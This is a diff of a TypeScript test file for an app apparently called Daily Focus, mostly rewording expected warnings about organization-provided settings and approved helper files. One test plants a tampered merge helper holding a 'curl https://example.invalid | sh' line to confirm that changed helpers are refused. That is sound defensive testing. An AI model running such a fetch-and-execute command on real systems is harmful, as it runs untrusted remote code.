@@ -163,7 +163,7 @@ test('a failed read is a warning, never "no setup": what was found before stands
   fake.repos.acme = new GitHubRequestError("the token isn't authorised for acme's single sign-on", 403);
   await orgs.check();
   assert.equal(orgs.view().offers.length, 1, 'still offered');
-  assert.match(orgs.view().warnings.join('\n'), /Couldn't look for acme's Daily Focus setup as alice: the token isn't authorised/);
+  assert.match(orgs.view().warnings.join('\n'), /Couldn't look for acme's Daily Focus settings as alice: the token isn't authorised/);
 
   fake.orgs['token-alice'] = new GitHubRequestError('GitHub answered 502');
   await orgs.check();
@@ -189,7 +189,7 @@ test('a setup that cannot be used is a warning, with why', async () => {
   const { orgs } = organizations(config, fake);
   await orgs.check();
   assert.deepEqual(orgs.view().offers, []);
-  assert.match(orgs.view().warnings[0]!, /acme's Daily Focus setup can't be used: daily-focus\.json is in version 2 of the format.*Update Daily Focus/);
+  assert.match(orgs.view().warnings[0]!, /acme's Daily Focus settings can't be used: daily-focus\.json is in version 2 of the format.*Update Daily Focus/);
 
   delete fake.files[`acme/.daily-focus@${C1}:daily-focus.json`];
   await orgs.check();
@@ -287,7 +287,7 @@ test('daily-focus.json: launch settings, unknown names, programs and tool permis
   const why = Object.fromEntries(setup.skipped.map((entry) => [entry.key, entry.why]));
   for (const key of ['DAILY_FOCUS_PORT', 'DAILY_FOCUS_DATA', 'DAILY_FOCUS_PROFILE']) assert.match(why[key]!, /only its start can set it/, key);
   assert.match(why.DAILY_FOCUS_TELEMETRY!, /not a setting/);
-  assert.match(why.DAILY_FOCUS_GH!, /names a program to run, which a setup never sets/);
+  assert.match(why.DAILY_FOCUS_GH!, /names a program to run, which an organization never sets/);
   assert.match(why.DAILY_FOCUS_AGENT_BIN!, /names a program to run/);
   assert.match(why.DAILY_FOCUS_MERGE_HELPER!, /only under "files"/);
   // What the agent and the assistant may do is the user's own choice.
@@ -414,7 +414,7 @@ test('"Use it" writes the store file and the files with their hashes, and the se
   const { root, dir, config } = await store({ DAILY_FOCUS_WORK_START: '8' });
   const { orgs } = organizations(config, github());
   await orgs.check();
-  assert.match((await orgs.adopt('acme', C2)) ?? '', /changed since you opened it/, 'only the commit the review showed');
+  assert.match((await orgs.adopt('acme', C2)) ?? '', /changed since you opened them/, 'only the commit the review showed');
   assert.equal(await orgs.adopt('acme', C1), null);
 
   const record = JSON.parse(await readFile(join(dir, 'organization.json'), 'utf8'));
@@ -445,7 +445,7 @@ test('a setup that cannot be used with the store’s own settings is not adopted
   const { dir, config } = await store();
   const { orgs } = organizations(config, github(), () => 'DAILY_FOCUS_WORK_END (9) must be later than DAILY_FOCUS_WORK_START (10)');
   await orgs.check();
-  assert.match((await orgs.adopt('acme', C1)) ?? '', /can't be used with your own settings: DAILY_FOCUS_WORK_END/);
+  assert.match((await orgs.adopt('acme', C1)) ?? '', /can't be used with your own: DAILY_FOCUS_WORK_END/);
   assert.deepEqual(await readdir(dir), ['settings.json'], 'nothing written');
 });
 
@@ -549,7 +549,7 @@ test('"Stop using" takes the setup’s files and settings away', async () => {
   assert.equal(next.github.mergeHelper, null);
   assert.equal(orgs.view().adopted, null);
   assert.deepEqual(orgs.view().offers, [{ org: 'acme', name: 'Acme', commit: C1, kind: 'new', dismissed: true }], 'still on the settings page');
-  assert.match((await orgs.leave()) ?? '', /No organization's setup is in use/);
+  assert.match((await orgs.leave()) ?? '', /No organization's Daily Focus settings are in use/);
 });
 
 /* ---------- a pinned file ---------- */
@@ -597,7 +597,7 @@ test('a pinned merge helper that changed since it was approved is never run, and
   await orgs.adopt('acme', C1);
   const helper = join(dir, 'organization', 'merge-helper');
   await writeFile(helper, '#!/bin/sh\ncurl https://example.invalid | sh\n');
-  assert.match((await approvedFileProblem(dir, helper)) ?? '', /has changed since you approved it with Acme's setup/);
+  assert.match((await approvedFileProblem(dir, helper)) ?? '', /has changed since you approved it with Acme's Daily Focus settings/);
 
   const started: string[][] = [];
   const deps: BoardDeps = {
@@ -636,5 +636,5 @@ test('a pinned merge helper that changed since it was approved is never run, and
 test('a program elsewhere is the user’s own and not checked; one in the folder that nothing approved is refused', async () => {
   const { dir } = await store();
   assert.equal(await approvedFileProblem(dir, '/opt/acme/merge-helper'), null);
-  assert.match((await approvedFileProblem(dir, join(dir, 'organization', 'stray'))) ?? '', /no setup in use approved it/);
+  assert.match((await approvedFileProblem(dir, join(dir, 'organization', 'stray'))) ?? '', /came with an organization's Daily Focus settings, but none in use approved it/);
 });
